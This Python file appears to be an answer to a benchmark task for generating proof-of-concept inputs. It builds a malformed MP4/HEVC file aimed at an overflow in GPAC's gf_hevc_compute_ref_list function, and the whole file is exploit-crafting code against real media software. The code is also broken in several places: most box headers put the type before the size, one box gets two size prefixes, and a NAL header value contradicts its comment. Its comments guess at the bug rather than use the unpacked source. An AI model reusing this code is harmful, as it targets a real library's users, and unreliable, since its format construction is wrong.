import os
import tempfile
import subprocess
import struct
import tarfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball to examine source code
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r:*') as tar:
                tar.extractall(tmpdir)
            
            # Look for vulnerable function pattern in source files
            vuln_pattern = "gf_hevc_compute_ref_list"
            
            # We need to craft a PoC based on typical HEVC/MP4 structure
            # The vulnerability likely occurs when parsing reference picture lists
            
            # Create a minimal MP4/HEVC structure that triggers the vulnerable function
            # with malformed reference list data
            
            # Basic MP4 structure with HEVC track
            poc = self._create_malformed_hevc_mp4()
            
            return poc
    
    def _create_malformed_hevc_mp4(self) -> bytes:
        # Create a minimal MP4 file with HEVC track that triggers the vulnerability
        # Based on typical stack overflow patterns and the given length
        
        # FTYP box
        ftyp = b'ftyp' + struct.pack('>I', 24)  # box size
        ftyp += b'isom'  # major brand
        ftyp += struct.pack('>I', 0)  # minor version
        ftyp += b'isom' + b'hevc'  # compatible brands
        
        # MOOV box (movie header)
        moov_size = 500  # Will be adjusted
        moov = b'moov'
        
        # MVHD box (movie header)
        mvhd = b'mvhd' + struct.pack('>I', 108)  # box size
        mvhd += struct.pack('>I', 0)  # version + flags
        mvhd += struct.pack('>II', 0, 0)  # creation & modification time
        mvhd += struct.pack('>I', 1000)  # timescale
        mvhd += struct.pack('>I', 0)  # duration
        mvhd += struct.pack('>I', 0x00010000)  # rate
        mvhd += struct.pack('>H', 0x0100)  # volume
        mvhd += b'\x00' * 10  # reserved
        mvhd += struct.pack('>IIIIIIIII',  # matrix
            0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
        mvhd += b'\x00' * 24  # pre-defined
        mvhd += struct.pack('>I', 0xFFFFFFFF)  # next track ID
        
        # TRAK box (track)
        trak = b'trak'
        
        # TKHD box (track header)
        tkhd = b'tkhd' + struct.pack('>I', 92)  # box size
        tkhd += struct.pack('>I', 1)  # version + flags (track enabled)
        tkhd += struct.pack('>II', 0, 0)  # creation & modification time
        tkhd += struct.pack('>I', 1)  # track ID
        tkhd += b'\x00' * 4  # reserved
        tkhd += struct.pack('>I', 0)  # duration
        tkhd += b'\x00' * 8  # reserved
        tkhd += struct.pack('>H', 0)  # layer
        tkhd += struct.pack('>H', 0)  # alternate group
        tkhd += struct.pack('>H', 0)  # volume
        tkhd += b'\x00' * 2  # reserved
        tkhd += struct.pack('>IIIIIIIII',  # matrix
            0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
        tkhd += struct.pack('>II', 0, 0)  # width & height
        
        # MDIA box (media)
        mdia = b'mdia'
        
        # MDHD box (media header)
        mdhd = b'mdhd' + struct.pack('>I', 32)  # box size
        mdhd += struct.pack('>I', 0)  # version + flags
        mdhd += struct.pack('>II', 0, 0)  # creation & modification time
        mdhd += struct.pack('>I', 1000)  # timescale
        mdhd += struct.pack('>I', 0)  # duration
        mdhd += struct.pack('>H', 0x55C4)  # language
        mdhd += b'\x00' * 2  # pre-defined
        
        # HDLR box (handler)
        hdlr = b'hdlr' + struct.pack('>I', 33)  # box size
        hdlr += struct.pack('>I', 0)  # version + flags
        hdlr += b'\x00' * 4  # pre-defined
        hdlr += b'vide'  # handler type
        hdlr += b'\x00' * 12  # reserved
        hdlr += b'VideoHandler' + b'\x00'  # name
        
        # MINF box (media information)
        minf = b'minf'
        
        # VMHD box (video media header)
        vmhd = b'vmhd' + struct.pack('>I', 20)  # box size
        vmhd += struct.pack('>I', 1)  # version + flags
        vmhd += struct.pack('>HHHH', 0, 0, 0, 0)  # graphics mode & opcolor
        
        # DINF box (data information)
        dinf = b'dinf'
        
        # DREF box (data reference)
        dref = b'dref' + struct.pack('>I', 28)  # box size
        dref += struct.pack('>I', 0)  # version + flags
        dref += struct.pack('>I', 1)  # entry count
        
        # URL box
        url = b'url ' + struct.pack('>I', 12)  # box size
        url += struct.pack('>I', 1)  # version + flags (self-contained)
        
        dref += url
        
        dinf += struct.pack('>I', len(dinf) + 4) + dref
        
        # STBL box (sample table)
        stbl = b'stbl'
        
        # STSD box (sample description)
        stsd = b'stsd' + struct.pack('>I', 146)  # box size
        stsd += struct.pack('>I', 0)  # version + flags
        stsd += struct.pack('>I', 1)  # entry count
        
        # HEVC sample entry
        hevc = b'hvc1'  # format
        hevc += b'\x00' * 6  # reserved
        hevc += struct.pack('>H', 1)  # data reference index
        
        # HEVC configuration box
        hvcC = self._create_malformed_hvcc()
        
        hevc += hvcC
        
        # Pad to correct size
        hevc += b'\x00' * (146 - 8 - len(hevc))
        
        stsd += hevc
        
        # STTS box (time-to-sample)
        stts = b'stts' + struct.pack('>I', 16)  # box size
        stts += struct.pack('>I', 0)  # version + flags
        stts += struct.pack('>I', 0)  # entry count
        
        # STSC box (sample-to-chunk)
        stsc = b'stsc' + struct.pack('>I', 16)  # box size
        stsc += struct.pack('>I', 0)  # version + flags
        stsc += struct.pack('>I', 0)  # entry count
        
        # STSZ box (sample size)
        stsz = b'stsz' + struct.pack('>I', 20)  # box size
        stsz += struct.pack('>I', 0)  # version + flags
        stsz += struct.pack('>I', 0)  # sample size
        stsz += struct.pack('>I', 0)  # sample count
        
        # STCO box (chunk offset)
        stco = b'stco' + struct.pack('>I', 16)  # box size
        stco += struct.pack('>I', 0)  # version + flags
        stco += struct.pack('>I', 0)  # entry count
        
        stbl += struct.pack('>I', len(stbl) + 4 + len(stsd)) + stsd
        stbl += struct.pack('>I', len(stbl) + 4 + len(stts)) + stts
        stbl += struct.pack('>I', len(stbl) + 4 + len(stsc)) + stsc
        stbl += struct.pack('>I', len(stbl) + 4 + len(stsz)) + stsz
        stbl += struct.pack('>I', len(stbl) + 4 + len(stco)) + stco
        
        minf += struct.pack('>I', len(minf) + 4 + len(vmhd)) + vmhd
        minf += struct.pack('>I', len(minf) + 4 + len(dinf)) + dinf
        minf += struct.pack('>I', len(minf) + 4 + len(stbl)) + stbl
        
        mdia += struct.pack('>I', len(mdia) + 4 + len(mdhd)) + mdhd
        mdia += struct.pack('>I', len(mdia) + 4 + len(hdlr)) + hdlr
        mdia += struct.pack('>I', len(mdia) + 4 + len(minf)) + minf
        
        trak += struct.pack('>I', len(trak) + 4 + len(tkhd)) + tkhd
        trak += struct.pack('>I', len(trak) + 4 + len(mdia)) + mdia
        
        moov += struct.pack('>I', len(moov) + 4 + len(mvhd)) + mvhd
        moov += struct.pack('>I', len(moov) + 4 + len(trak)) + trak
        moov = struct.pack('>I', len(moov) + 4) + moov
        
        # MDAT box with malformed HEVC NAL units
        mdat = self._create_malformed_hevc_nal_units()
        
        # Combine everything
        poc = ftyp + moov + mdat
        
        # Ensure exact length of 1445 bytes
        if len(poc) < 1445:
            poc += b'A' * (1445 - len(poc))
        elif len(poc) > 1445:
            poc = poc[:1445]
        
        return poc
    
    def _create_malformed_hvcc(self) -> bytes:
        # Create a malformed HEVC configuration box
        # This triggers the vulnerable function when parsing reference lists
        
        hvcC = b'hvcC' + struct.pack('>I', 50)  # box size
        
        # Configuration version
        hvcC += b'\x01'  # configurationVersion
        
        # General profile space, tier flag, profile, compatibility, constraint flags
        hvcC += b'\x00' * 4
        
        # General level
        hvcC += b'\x00'
        
        # Min spatial segmentation
        hvcC += struct.pack('>H', 0)
        
        # Parallelism type
        hvcC += b'\x00'
        
        # Chroma format & bit depth
        hvcC += b'\x00'
        
        # Average frame rate
        hvcC += struct.pack('>H', 0)
        
        # Constant frame rate, num temporal layers, temporal id nested
        hvcC += b'\x00'
        
        # Length size minus one
        hvcC += b'\x03'
        
        # Number of arrays (malformed - large number to cause overflow)
        hvcC += b'\xFF'  # 255 arrays - triggers buffer overflow
        
        # For each array (we'll create malformed ones)
        # SPS array
        hvcC += b'\x21'  # SPS type
        hvcC += struct.pack('>H', 1)  # 1 SPS
        
        # Malformed SPS that causes reference list overflow
        sps = b'\x00' * 20  # Minimal SPS
        hvcC += struct.pack('>H', len(sps)) + sps
        
        # PPS array
        hvcC += b'\x22'  # PPS type
        hvcC += struct.pack('>H', 1)  # 1 PPS
        
        # Malformed PPS with large reference lists
        pps = b'\x00' * 20  # Minimal PPS
        hvcC += struct.pack('>H', len(pps)) + pps
        
        # Fill remaining arrays with garbage
        remaining = 50 - len(hvcC)
        if remaining > 0:
            hvcC += b'\x00' * remaining
        
        return struct.pack('>I', len(hvcC)) + hvcC
    
    def _create_malformed_hevc_nal_units(self) -> bytes:
        # Create malformed HEVC NAL units that trigger the overflow
        
        mdat = b'mdat'
        
        # Start with normal NAL unit header
        nal_data = b'\x00\x00\x00\x01'  # Start code
        
        # Create a malformed slice segment that triggers gf_hevc_compute_ref_list
        # Type: IDR_W_RADL (19) with reference list overflow
        nal_header = 0x40  # NAL unit type 19, layer 0, temporal 0
        nal_data += bytes([nal_header])
        
        # First slice segment header
        # first_slice_segment_in_pic_flag = 1
        # no_output_of_prior_pics_flag = 0
        # slice_pic_parameter_set_id = 0
        slice_header = 0x80  # 10000000
        
        # Add large number of reference indices to overflow buffer
        # This is where the vulnerability occurs
        slice_header += 0x40  # Set slice_type to P-slice (1)
        
        nal_data += bytes([slice_header])
        
        # Add more data to trigger the overflow in reference list computation
        # The vulnerability is in gf_hevc_compute_ref_list() which lacks length checks
        # We need to create conditions that cause it to read/write out of bounds
        
        # Add malformed reference picture lists
        # Large delta_poc values to trigger integer overflows/underflows
        for i in range(100):
            # Add delta POC values that will cause buffer overflow
            nal_data += struct.pack('>h', 32767)  # Max positive short
        
        # Add slice data that references non-existent reference pictures
        nal_data += b'\xFF' * 500  # Fill with 0xFF to ensure we hit the vulnerability
        
        # Finalize mdat box
        mdat = struct.pack('>I', len(mdat) + 4 + len(nal_data)) + mdat + nal_data
        
        return mdat